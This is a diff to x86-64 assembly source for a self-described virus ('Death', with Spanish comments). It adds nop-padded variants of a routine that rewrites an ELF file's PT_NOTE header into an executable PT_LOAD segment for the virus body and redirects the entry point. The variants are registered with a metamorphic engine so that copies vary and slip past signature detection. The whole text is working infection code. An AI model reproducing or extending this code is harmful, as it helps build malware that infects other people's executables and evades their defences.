@@ -73,6 +73,8 @@ section .text
 
     __F_mod_pt_note:
         ; Death.note_phdr_ptr es una dirección de memoria que apunta a un puntero
+        nop
+        nop
         lea rax, VAR(Death.note_phdr_ptr)
         mov rax, [rax]
         mov [rax], dword 0x01                           ; p_type = PT_LOAD
@@ -92,6 +94,7 @@ section .text
         mov qword [rax+Elf64_Phdr.p_align], 0x1000      ; p_align = 0x1000 (4KB)
         ret
     __F_mod_pt_note__end:
+	F_mod_pt_note_len equ $ - __F_mod_pt_note
 
     __F_ftruncate:
         ; ftruncate(fd_file, file_final_len)
@@ -773,6 +776,7 @@ section .text
 
 	.mod_functions:
         CALL_METAMORPH(crazy, 7)
+        CALL_METAMORPH(mod_pt_note, 2)
 
     .encrypt_data_block:
         CALL_ENCRYPT(encrypt_block) ; encripta
@@ -1056,26 +1060,52 @@ section .text
         ret
     __F_crazy_6__end:
 
-    ; __F_mod_pt_note_0:
-    ;     ; Death.note_phdr_ptr es una dirección de memoria que apunta a un puntero
-    ;     lea rax, VAR(Death.note_phdr_ptr)
-    ;     mov rax, [rax]
-    ;     mov [rax], dword 0x01                           ; p_type = PT_LOAD
-    ;     mov [rax+Elf64_Phdr.p_flags], dword P_FLAGS     ; P_FLAGS = PF_X | PF_R | PF_W
-    ;     mov ecx, dword VAR(Death.file_final_len)
-    ;     sub ecx, dword VAR(Death.virus_size)
-    ;     mov [rax+Elf64_Phdr.p_offset], rcx              ; p_offset = file_final_len - virus_size
-    ;     mov VAR(Death.virus_offset), rcx
-    ;     mov rcx, VAR(Death.max_vaddr_end)
-    ;     ALIGN rcx
-    ;     mov [rax+Elf64_Phdr.p_vaddr], rcx               ; p_vaddr = ALIGN(max_pvaddr_len)
-    ;     mov [rax+Elf64_Phdr.p_paddr], rcx               ; p_paddr = p_vaddr
-    ;     mov VAR(Death.new_entry), rcx
-    ;     mov ecx, dword VAR(Death.virus_size)
-    ;     mov [rax+Elf64_Phdr.p_filesz], rcx              ; p_filesz = virus_size
-    ;     mov [rax+Elf64_Phdr.p_memsz], rcx               ; p_memsz = virus_size
-    ;     mov qword [rax+Elf64_Phdr.p_align], 0x1000      ; p_align = 0x1000 (4KB)
-    ;     ret
-    ; __F_mod_pt_note_0__end:
+    __F_mod_pt_note_0:
+        ; Death.note_phdr_ptr es una dirección de memoria que apunta a un puntero
+        nop
+        lea rax, VAR(Death.note_phdr_ptr)
+        mov rax, [rax]
+        mov [rax], dword 0x01                           ; p_type = PT_LOAD
+        mov [rax+Elf64_Phdr.p_flags], dword P_FLAGS     ; P_FLAGS = PF_X | PF_R | PF_W
+        mov ecx, dword VAR(Death.file_final_len)
+        sub ecx, dword VAR(Death.virus_size)
+        mov [rax+Elf64_Phdr.p_offset], rcx              ; p_offset = file_final_len - virus_size
+        mov VAR(Death.virus_offset), rcx
+        mov rcx, VAR(Death.max_vaddr_end)
+        ALIGN rcx
+        mov [rax+Elf64_Phdr.p_vaddr], rcx               ; p_vaddr = ALIGN(max_pvaddr_len)
+        mov [rax+Elf64_Phdr.p_paddr], rcx               ; p_paddr = p_vaddr
+        mov VAR(Death.new_entry), rcx
+        mov ecx, dword VAR(Death.virus_size)
+        mov [rax+Elf64_Phdr.p_filesz], rcx              ; p_filesz = virus_size
+        mov [rax+Elf64_Phdr.p_memsz], rcx               ; p_memsz = virus_size
+        mov qword [rax+Elf64_Phdr.p_align], 0x1000      ; p_align = 0x1000 (4KB)
+        nop
+        ret
+    __F_mod_pt_note_0__end:
+
+    __F_mod_pt_note_1:
+        ; Death.note_phdr_ptr es una dirección de memoria que apunta a un puntero
+        lea rax, VAR(Death.note_phdr_ptr)
+        mov rax, [rax]
+        mov [rax], dword 0x01                           ; p_type = PT_LOAD
+        mov [rax+Elf64_Phdr.p_flags], dword P_FLAGS     ; P_FLAGS = PF_X | PF_R | PF_W
+        mov ecx, dword VAR(Death.file_final_len)
+        sub ecx, dword VAR(Death.virus_size)
+        mov [rax+Elf64_Phdr.p_offset], rcx              ; p_offset = file_final_len - virus_size
+        mov VAR(Death.virus_offset), rcx
+        mov rcx, VAR(Death.max_vaddr_end)
+        ALIGN rcx
+        mov [rax+Elf64_Phdr.p_vaddr], rcx               ; p_vaddr = ALIGN(max_pvaddr_len)
+        mov [rax+Elf64_Phdr.p_paddr], rcx               ; p_paddr = p_vaddr
+        mov VAR(Death.new_entry), rcx
+        mov ecx, dword VAR(Death.virus_size)
+        mov [rax+Elf64_Phdr.p_filesz], rcx              ; p_filesz = virus_size
+        mov [rax+Elf64_Phdr.p_memsz], rcx               ; p_memsz = virus_size
+        mov qword [rax+Elf64_Phdr.p_align], 0x1000      ; p_align = 0x1000 (4KB)
+        nop
+        nop
+        ret
+    __F_mod_pt_note_1__end:
 
     _finish:
